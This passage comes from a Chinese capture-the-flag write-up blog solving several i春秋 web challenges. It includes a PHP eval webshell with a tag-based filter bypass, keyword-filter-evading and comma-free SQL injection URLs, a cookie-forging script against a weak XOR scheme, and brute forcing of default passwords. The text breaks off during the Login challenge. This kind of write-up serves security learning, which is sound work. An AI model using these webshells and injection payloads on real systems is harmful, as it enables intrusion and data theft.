+<p><img src="i春秋CTF/25.png" alt=""><br>相信大家看到这个想法都跟我一样，传一个一句话上去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> @eval($_POST[&quot;code&quot;]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><br>结果显示上传成功<br>查看页面源代码可以看到上传的路径<code>/u/test.php</code><br>我们查看文件，发现把“&lt;”和”php ”给过滤掉了<br>那我们就很自然的想到PHP的长标签了<br>重新修改代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;PHP&quot;&gt;</span><br><span class="line"> @eval($_POST[&quot;code&quot;]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现上传成功，使用菜刀连接，发现flag.php<br><img src="i春秋CTF/26.png" alt=""><br>打开，得到flag<br><img src="i春秋CTF/27.png" alt=""></p>
+<h3 id="10-Code"><a href="#10-Code" class="headerlink" title="10. Code"></a>10. Code</h3><blockquote>
+<p>题目内容：考脑洞，你能过么？<br>题目地址：<a href="http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=hei.jpg" target="_blank" rel="noopener">http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=hei.jpg</a></p>
+</blockquote>
+<p>进入题目后看到一张图片，查看源代码是被BASE64编码了，源码太长就不放了，这里直接放上解码后的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * Date: 2015&#x2F;11&#x2F;16</span><br><span class="line"> * Time: 1:31</span><br><span class="line"> *&#x2F;</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">if(! isset($_GET[&#39;jpg&#39;]))</span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?jpg&#x3D;hei.jpg&#39;);</span><br><span class="line">$file &#x3D; $_GET[&#39;jpg&#39;];</span><br><span class="line">echo &#39;&lt;title&gt;file:&#39;.$file.&#39;&lt;&#x2F;title&gt;&#39;;</span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;,&quot;&quot;, $file);</span><br><span class="line">$file &#x3D; str_replace(&quot;config&quot;,&quot;_&quot;, $file);</span><br><span class="line">$txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>其实这段代码里面最有用的不是代码而是最容易被忽略掉的注释<br>注释里面有这句话：<code>Created by PhpStorm</code><br>这里脑补一下：用PhpStorm写出来的项目里面都会有/.idea文件,删除之后还会重新创建(当然可以禁止访问)，这就比较有意思了，我们可以访问<code>/.idea/workspace.xml</code><br>在这个页面里发现了两个有用的文件：<code>fl3g_ichuqiu.php   config.php</code><br>我们要的东西有可能就在这两个文件里，那么查看一下源文件：<br>    <a href="http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=fl3g_ichuqiu.php" target="_blank" rel="noopener">http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=fl3g_ichuqiu.php</a><br>访问之后发现并没有返回什么东西，是不是哪里出错了呢，看一看<code>index.php</code>文件，发现有一行把字符串<code>config</code>替换成了一个下划线<code>_</code><br>那么我们就需要构造URL来访问这个文件，既然config被替换成了下划线，那么payload如下：<br>    <a href="http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php" target="_blank" rel="noopener">http://cea11f0c10d14e938cd6b2402c1b3fc193002477900b454b.game.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</a><br>这样可以访问到这个文件，源码太长，这里还放解码后的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * Date: 2015&#x2F;11&#x2F;16</span><br><span class="line"> * Time: 1:31</span><br><span class="line"> *&#x2F;</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line">include(&#39;config.php&#39;);</span><br><span class="line">function random($length, $chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;) &#123;</span><br><span class="line">    $hash &#x3D; &#39;&#39;;</span><br><span class="line">    $max &#x3D; strlen($chars) - 1;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; $length; $i++)	&#123;</span><br><span class="line">        $hash .&#x3D; $chars[mt_rand(0, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($txt,$key)&#123;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .&#x3D; chr(ord($txt[$i])+10);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt &#x3D; $tmp;</span><br><span class="line">    $rnd&#x3D;random(4);</span><br><span class="line">    $key&#x3D;md5($rnd.$key);</span><br><span class="line">    $s&#x3D;0;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        if($s &#x3D;&#x3D; 32) $s &#x3D; 0;</span><br><span class="line">        $ttmp .&#x3D; $txt[$i] ^ $key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($rnd.$ttmp);</span><br><span class="line">&#125;</span><br><span class="line">function decrypt($txt,$key)&#123;</span><br><span class="line">    $txt&#x3D;base64_decode($txt);</span><br><span class="line">    $rnd &#x3D; substr($txt,0,4);</span><br><span class="line">    $txt &#x3D; substr($txt,4);</span><br><span class="line">    $key&#x3D;md5($rnd.$key);</span><br><span class="line"></span><br><span class="line">    $s&#x3D;0;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        if($s &#x3D;&#x3D; 32) $s &#x3D; 0;</span><br><span class="line">        $tmp .&#x3D; $txt[$i]^$key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .&#x3D; chr(ord($tmp[$i])-10);</span><br><span class="line">    &#125;</span><br><span class="line">    return $tmp1;</span><br><span class="line">&#125;</span><br><span class="line">$username &#x3D; decrypt($_COOKIE[&#39;user&#39;],$key);</span><br><span class="line">if ($username &#x3D;&#x3D; &#39;system&#39;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    setcookie(&#39;user&#39;,encrypt(&#39;guest&#39;,$key));</span><br><span class="line">    echo &quot;╮(╯▽╰)╭&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>代码审计喽<br>其实就是将函数decrypt返回的值传给username。<br>如果username=system，那么输出flag</p>
+<p>所以说，我们现在是需要得到变量key和变量rnd</p>
+<p><img src="i春秋CTF/28.png" alt=""></p>
+<p>然后这里附上得到username值的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $txt1 &#x3D; &#39;guest&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $txt1[$i] &#x3D; chr(ord($txt1[$i])+10);</span><br><span class="line">    &#125;</span><br><span class="line">    $cookie_guest &#x3D; &#39;emVTQkZHCh8d&#39;; </span><br><span class="line">    $cookie_guest &#x3D; base64_decode($cookie_guest);</span><br><span class="line">    $rnd &#x3D; substr($cookie_guest,0,4); </span><br><span class="line">    $ttmp &#x3D; substr($cookie_guest,4);</span><br><span class="line">    $key&#x3D;&#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($txt1); $i++) &#123;</span><br><span class="line">        $key .&#x3D; ($txt1[$i] ^ $ttmp[$i]);&#x2F;&#x2F;$key&#x3D;md5($rnd.$key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $txt2 &#x3D; &#39;system&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($txt2); $i++) &#123;</span><br><span class="line">        $txt2[$i] &#x3D; chr(ord($txt2[$i])+10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $md5 &#x3D; &#39;0123456789abcdef&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($md5); $i++) &#123;</span><br><span class="line">        $key_new &#x3D; $key.$md5[$i];</span><br><span class="line">        $cookie_system&#x3D;&#39;&#39;;</span><br><span class="line">        for ($j &#x3D; 0; $j &lt; strlen($txt2); $j++) &#123;</span><br><span class="line">            $cookie_system .&#x3D; ($key_new[$j] ^ $txt2[$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        $cookie_system &#x3D; base64_encode($rnd.$cookie_system);</span><br><span class="line">        echo $cookie_system.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>代码运行后会得到一串值</p>
+<p><img src="i春秋CTF/29.png" alt=""></p>
+<p>我们用burpsuite对username的值进行爆破<br><img src="i春秋CTF/30.png" alt=""></p>
+<p>爆破会得到一个正确的username的值，然后直接修改后访问就可以得到flag<br><img src="i春秋CTF/31.png" alt=""></p>
+<h3 id="11-SQL"><a href="#11-SQL" class="headerlink" title="11.SQL"></a>11.SQL</h3><blockquote>
+<p>题目内容：出题人就告诉你这是个注入，有种别走！</p>
+</blockquote>
+<p>进入后就说flag在数据库中，那就开始注入吧，测试之后发现不需要单引号，那么看看有几个字段，<br><code>http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1 order by 3</code><br><img src="i春秋CTF/32.png" alt=""></p>
+<p>发现返回了<code>inj code!</code> 判断肯定是过滤了关键字，那么用注释符绕/<strong>/过：<br>`<a href="http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1</a> or/</strong>/der by 3`</p>
+<p><img src="i春秋CTF/33.png" alt=""><br>页面没有返回，猜测可能是注释符也被过滤了，那就试试<code>&lt;&gt;</code>这个符号<br><code>http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1 or&lt;&gt;der by 3</code><br><img src="i春秋CTF/35.png" alt=""><br>成功返回东西，说明这样可以绕过，那么试一下4：<br><code>http://40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com/index.php?id=1 or/**/der by 4</code><br><img src="i春秋CTF/36.png" alt=""><br>返回为空，说明字段为3.<br>然后开始注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取数据库名：</span><br><span class="line">http:&#x2F;&#x2F;40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com&#x2F;index.php?id&#x3D;1 uni&lt;&gt;on se&lt;&gt;lect 1,database(),3</span><br></pre></td></tr></table></figure><br>    数据库：sqli<br><img src="i春秋CTF/37.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取表名：</span><br><span class="line">	http:&#x2F;&#x2F;40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com&#x2F;index.php?id&#x3D;1 uni&lt;&gt;on se&lt;&gt;lect 1,group_concat(table_name),3 from info&lt;&gt;rmation_schema.tables where table_schema&#x3D;&#39;sqli&#39;</span><br><span class="line">	表：info</span><br></pre></td></tr></table></figure>
+<p><img src="i春秋CTF/38.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取列名：</span><br><span class="line">	http:&#x2F;&#x2F;40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com&#x2F;index.php?id&#x3D;1 uni&lt;&gt;on se&lt;&gt;lect 1,group_concat(column_name),3 from info&lt;&gt;rmation_schema.columns where table_name&#x3D;&#39;info&#39;</span><br><span class="line">	列：id,title,flAg_T5ZNdrm</span><br></pre></td></tr></table></figure><br><img src="i春秋CTF/39.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取字段：</span><br><span class="line">	http:&#x2F;&#x2F;40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com&#x2F;index.php?id&#x3D;1 uni&lt;&gt;on se&lt;&gt;lect 1,group_concat(id,title,flAg_T5ZNdrm),3 from info</span><br></pre></td></tr></table></figure></p>
+<p><img src="i春秋CTF/40.png" alt=""><br>    字段：<br>    id:1,2<br>    title:flag{在数据库中},test<br>    flAg_T5ZNdrm:flag{6628cc6e-8930-4dd2-b1cc-a0835365010b},test</p>
+<h3 id="12-SQLi"><a href="#12-SQLi" class="headerlink" title="12.SQLi"></a>12.SQLi</h3><blockquote>
+<p>题目内容：后台有获取flag的线索 </p>
+</blockquote>
+<p>拿到题目后是一个空白页面，查看源代码发现有个提示：<code>&lt;!-- login.php?id=1 --&gt;</code><br>访问之后测试了各种方法发现并不能注入，然后查看源代码也没有提示，请求头也没有东西，这时候要么就是有隐藏的后台，要么就是页面发生了跳转，利用扫描器扫了很长时间也没找到后台，那可能就是重定向了，我们查看页面的流量监测，然后访问<br><code>http://aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com/index.php</code><br>这时候可以看到总共访问了两个网页<br><img src="i春秋CTF/41.png" alt=""><br>其中一个就是302跳转，我们查看一下这个302的响应头：<br><img src="i春秋CTF/42.png" alt=""></p>
+<p>在它里面发现了这个东西<code>l0gin.php?id=1</code><br>估计真正的注入网站是这个<br>我们先访问一下<code>http://aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com/l0gin.php?id=1</code><br><img src="i春秋CTF/43.png" alt=""><br>页面返回了查询的内容，直接上sqlmap跑<br><img src="i春秋CTF/44.png" alt=""><br>返回了这个东西，发现是可以注入的，但是让它继续跑却跑不出来了，那就手工注入吧</p>
+<p>多次测试后发现<code>，</code>后边的东西被过滤掉了，那就不能用逗号了，这里直接脑补一个不用逗号也可以注入的SQL语句（Join)<br>    <code>id=-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select version() ) b %23</code></p>
+<p>然后开始查询我们要的东西了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：</span><br><span class="line">http:&#x2F;&#x2F;aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com&#x2F;l0gin.php?id&#x3D;-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select database() ) b %23</span><br></pre></td></tr></table></figure>
+<p><img src="i春秋CTF/45.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询表：</span><br><span class="line">http:&#x2F;&#x2F;aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com&#x2F;l0gin.php?id&#x3D;-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39; ) b %23</span><br></pre></td></tr></table></figure>
+<p><img src="i春秋CTF/46.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询列：</span><br><span class="line">http:&#x2F;&#x2F;aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com&#x2F;l0gin.php?id&#x3D;-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; ) b %23</span><br></pre></td></tr></table></figure>
+<p><img src="i春秋CTF/47.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询字段：</span><br><span class="line">http:&#x2F;&#x2F;aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com&#x2F;l0gin.php?id&#x3D;-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select group_concat(flag_9c861b688330) from users ) b %23</span><br></pre></td></tr></table></figure>
+<p><img src="i春秋CTF/48.png" alt=""></p>
+<p>然后就得到了flag</p>
+<h3 id="13-123"><a href="#13-123" class="headerlink" title="13.123"></a>13.123</h3><blockquote>
+<p>题目内容：12341234，然后就解开了<br>分值：50分 类型：Web</p>
+</blockquote>
+<p>打开网址，查看网页源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;会员登录&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;h4&gt;请输入帐号密码进行登录&lt;&#x2F;h4&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&#39;用户名&#39; &#x2F;&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&#39;密码&#39; &#x2F;&gt;</span><br><span class="line">        &lt;br &#x2F;&gt; &lt;br &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 用户信息都在user.php里 --&gt;</span><br><span class="line">        &lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure>
+<p>重要的是这两句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 用户信息都在user.php里 --&gt;</span><br><span class="line">&lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>查看<code>user.php</code>是空的，那就看一下<code>user.php.bak</code> ，发现可以下载下来，那么下载到本地我们看一下<br><img src="i春秋CTF/49.png" alt=""><br>是所有的用户名，再加上给的提示 默认密码是用户名+出生日期  那么很明显了 这道题要用爆破，我们抓个包<br><img src="i春秋CTF/50.png" alt=""><br>注意上边的<code>Attack type</code>，这个要选择我选的这个，意思是两个参数一起爆破<br><code>密码用姓名+1990，这个没办法只能试出来</code><br>通过爆破的结果可以看到有一个账户是<code>lixiuyun lixiuyun1990</code><br><img src="i春秋CTF/51.png" alt=""><br>那么登陆上去，是空的，查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;个人中心&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;!-- 存在漏洞需要去掉  --&gt;</span><br><span class="line">&lt;!-- &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt; --&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>注释里的东西是文件上传，那么我们只能在本地搭建一个这样的环境做测试<br>在本地弄一个1.php的文件，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;个人中心&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;!-- 存在漏洞需要去掉  --&gt;</span><br><span class="line">&lt;!-- &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;026c6f6870ec4ba2a443e1487cf09eca89966db584ff4053.game.ichunqiu.com&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt; --&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>注意 form action要填写你的i春秋上边的题目地址</p>
+<p>然后我们上传，其实就是一般的文件上传，我么上传一个图片，把后缀改成<code>.pht</code>就可以了<br>上传成功后会看到这个东西<br><img src="i春秋CTF/52.png" alt=""><br>那么直接在本地的环境上访问<code>http://026c6f6870ec4ba2a443e1487cf09eca89966db584ff4053.game.ichunqiu.com/view.php</code><br>出来一个超链接，点开是<code>file?</code><br>那么应该就很明显了，我们直接查看<code>url/view.php?file=flag</code><br>页面返回<code>filter &quot;flag&quot;</code><br>应该是过滤了<code>flag</code><br>那么用双写来绕过过滤<br><code>url/view.php?file=flaflagg</code><br>这样就看到了flag<br><img src="i春秋CTF/53.png" alt=""></p>
+<h3 id="14-Login"><a href="#14-Login" class="headerlink" title="14.Login"></a>14.Login</h3><blockquote>
+<p>题目名称：Login<br>题目内容：加油，我看好你</p>
+</blockquote>
+<p>首先进入题目，一个登陆框，需要输入账号密码</p>
+<p><img src="i春秋CTF/54.png" alt=""></p>
+<p>查看源代码：猛一看没啥有用的东西，其实往下拉一拉会看到好东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  test1 test1  --&gt;</span><br></pre></td></tr></table></figure><br><img src="i春秋CTF/55.png" alt=""></p>
+<p>那么就登陆吧：用户名和密码已经给了</p>
+<p>登陆之后页面自动跳转了：<br>    <a href="http://ca965ed9a1e142e4a7d95044336b258107b780911e6f40b0.game.ichunqiu.com/member.php" target="_blank" rel="noopener">http://ca965ed9a1e142e4a7d95044336b258107b780911e6f40b0.game.ichunqiu.com/member.php</a><br>跳转到了这个页面，里面没啥东西</p>
+<p><img src="i春秋CTF/56.png" alt=""></p>
+<p>查看源代码也没有<br>看一下响应头，发现了一个参数：<code>show:0</code></p>
+<p><img src="i春秋CTF/57.png" alt=""></p>
